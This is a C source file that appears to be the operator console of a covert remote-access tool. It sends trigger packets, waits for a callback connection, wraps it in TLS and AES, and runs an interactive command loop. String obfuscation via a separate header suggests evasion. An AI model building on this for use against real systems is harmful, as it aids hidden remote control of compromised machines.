#include "hclient.h"
#include "debug.h"
#include "threads.h"
#include "crypto.h"
#include "colors.h"

#include "proj_strings.h"
#include "dhExchange.h"

#include <pthread.h>

//**************************************************************

pthread_mutex_t		tlock;

//**************************************************************
void Run( struct proc_vars* info, struct trigger_params *trigger_args )
{
	crypt_context		*cp;		// Command post connection context pointer

	pthread_mutex_init( &tlock, NULL );

	// if we aren't listening, then we don't need to take the lock.
	// taking the lock allows us to set-up the listening socket before sending the trigger packet(s)
	if ( info->listen == YES )
	{
		DLX(2, printf( " Requesting pthread_mutex_lock \n"));
		pthread_mutex_lock( &tlock );
		DLX(2, printf( " pthread_mutex_lock locked\n"));
	}

	// to avoid race condition where main thread exits before trigger is set,
	// don't call tigger_start() as a thread
	if ( info->trigger == YES && info->listen == NO )
	{
		DLX(2, printf( " Trigger mode set\n"));
		trigger_start ( (void *) trigger_args );
		return;
	}

	if ( info->trigger == YES && info->listen == YES )
	{
		DLX(2, printf( " Trigger mode set\n"));
		make_thread( trigger_start, (void *) trigger_args );
	}

	if ( info->listen == NO )
	{
		// trigger sent, if specified.  if not configured to listen, we are done.
		// not reached
		return;
	}

	DLX(2, printf( " Listen mode set\n"));
	// listen for and establish TCP connection. returns with accept() returns success
	if ( TcpInit( info ) == ERROR )
	{
		DLX(2, printf( " ERROR: TcpInit() returned error.\n"));
		return;
	}

	// at this point, we have an establish TCP/IP connection
	DisplayStatus(info);

	//printf( "\n %sEnabling encrypted communications:%s\n", BLUE, RESET );
	printf( "\n %s%s:%s\n", BLUE, run1String, RESET );

	// from a SSL/TLS perspective, the client acts like a SSL server
	if ((cp = crypt_setup_server(&info->tcpfd)) == NULL )
	{
		DLX(2, printf( " ERROR: crypt_setup_server() failed\n"));
		return;
	}
	DL(2);
	// start TLS handshake
	if (crypt_handshake(cp) != SUCCESS) {
		// TODO: encode this string(s)
		//printf( " ERROR: TLS connection with TLS client failed to initialize.\n" ); 
		printf("\t%s", run1Error);
		return;
	}
	printf("\t%s", run2String);
	DLX(2, printf(" TLS handshake complete.\n"));

	if ((aes_init(cp)) == 0) {
		DLX(4, printf("AES initialization failed"));
		printf("\t%s", run2Error);
		return;
	}
	printf("\t%s", run3String);
	printf("\n");
	// The following if statement used to have an else clause to call AutomaticMode() which did nothing.
	if ( info->interactive == YES ) {
		InteractiveMode(info, cp);
	}
	crypt_close_notify(cp);

	return;
}

//**************************************************************
// TODO: Incorporate this code into the Run function above.
void InteractiveMode(struct proc_vars* info, crypt_context *ioc)
{
   char cline[525];
   char** argv;


   while ((info->command != EXIT) && (info->command != SHUTDOWNBOTH)) {
      memset(cline, 0, 525);
      fprintf(stdout, "%s> ", info->progname);
      (void) fgets(cline, 525, stdin);
      cline[strlen(cline) - 1] = '\0';
      argv = BuildArgv(cline);
      if ((argv != NULL) && (argv[0] != '\0')) {
         CommandToFunction(argv, info, ioc);
      }
      FreeArgv(argv);
   }

}
